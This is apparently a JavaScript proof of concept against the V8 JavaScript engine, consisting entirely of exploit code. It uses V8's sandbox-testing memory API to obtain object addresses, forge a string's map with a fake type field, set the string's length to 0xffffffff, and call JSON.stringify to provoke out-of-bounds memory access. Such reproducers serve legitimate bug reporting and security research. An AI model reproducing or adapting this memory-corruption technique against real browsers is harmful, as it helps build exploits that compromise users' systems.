let sbx_memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
Sandbox.getAddressOf(sbx_memory);
const v2 = new Float32Array(1000);

let s = "AAAABBBB"
let s_addr = Sandbox.getAddressOf(s);
print("s_addr: 0x" + s_addr.toString(16));

const map_buffer = ["A", "A", "A", "A"]
let map_buffer_addr = Sandbox.getAddressOf(map_buffer);
print("map_buffer_addr: 0x" + map_buffer_addr.toString(16));

// set the type field to v8::internal::INTERNALIZED_TWO_BYTE_STRING_TYPE
sbx_memory.setUint16(map_buffer_addr + 8, 0x8, true);

// set the map of s to our fake map
sbx_memory.setUint32(s_addr, map_buffer_addr + 1, true);

// set the length field
sbx_memory.setUint32(s_addr + 8, 0xffffffff, true);

JSON.stringify(s, undefined, "国务院关于《土地");

